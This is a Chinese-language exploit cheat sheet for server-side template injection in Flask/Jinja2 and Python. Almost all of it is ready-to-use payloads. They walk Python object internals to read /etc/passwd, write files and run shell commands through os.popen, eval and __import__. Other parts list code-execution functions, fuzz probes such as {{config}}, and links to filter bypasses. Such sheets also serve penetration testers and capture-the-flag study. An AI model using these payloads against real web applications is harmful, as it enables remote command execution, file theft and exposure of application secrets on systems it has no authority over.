# EXP手册-服务端模板注入（SSTI） 
## 基础知识
[flask之ssti模版注入从零到入门](https://xz.aliyun.com/t/3679)
## EXP
### 0x01获取基本类    
```   
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8]
```
可以借助__getitem__绕过中括号限制：
```
''.__class__.__mro__.__getitem__(2)
{}.__class__.__bases__.__getitem__(0)
().__class__.__bases__.__getitem__(0)
request.__class__.__mro__.__getitem__(8)
```
注释：
```
__class__:获得当前对象的类
__bases__:列出其基类
__mro__ :列出解析方法的调用顺序，类似于bases
__subclasses__()：返回子类列表
__dict__ ： 列出当前属性/函数的字典
func_globals:返回一个包含函数全局变量的字典引用
```
### 0x02文件操作
>不同Python的版本，类方法中的子类列表是不同，下面主要是以python2为例子   

>```object.__subclasses__()[40]```为file类，所以可以对文件进行操作
>读文件：
```
object.__subclasses__()[40]('/etc/passwd').read()
```
>写文件：
```
object.__subclasses__()[40]('/tmp').write('test')
```
### 0x03执行命令


>```object.__subclasses__()[59].__init__.func_globals.linecache```下直接有os类，可以直接执行命令：
```
object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
```
>```object.__subclasses__()[59].__init__.__globals__.__builtins__```下有```eval，__import__```等的全局函数，可以利用此来执行命令：
```
object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

### 0x04任意代码执行以及文件读取的函数

>os 执行系统命令
```
import os
os.system('ipconfig')
```
>exec 任意代码执行
```
exec('__import__("os").system("ipconfig")')
```
>eval 任意代码执行
```
eval('__import__("os").system("ipconfig")')
```
>timeit 本是检测性能的，也可以任意代码执行
```
import timeit
timeit.timeit("__import__('os').system('ipconfig')",number=1)
```
>platform
```
import platform
platform.popen('ipconfig').read()
```
>subprocess
```
import subprocess
subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()
```
>file
```
file('/etc/passwd').read()
```
>open
```
open('/etc/passwd').read()
```
>codecs
```
import codecs
codecs.open('/etc/passwd').read()
```
### 0x05Fuzz
```
{{config}}
{{handler.settings}}
{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
```
### 0x06Bypass
- [Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)   

请求参数获取   
- GET: request.args
- Cookies: request.cookies
- Headers: request.headers
- Environment: request.environ
- Values: request.values

### Reference：
- [Flask/Jinja2 SSTI && python 沙箱逃逸](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)
- [Flask/Jinja2模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)
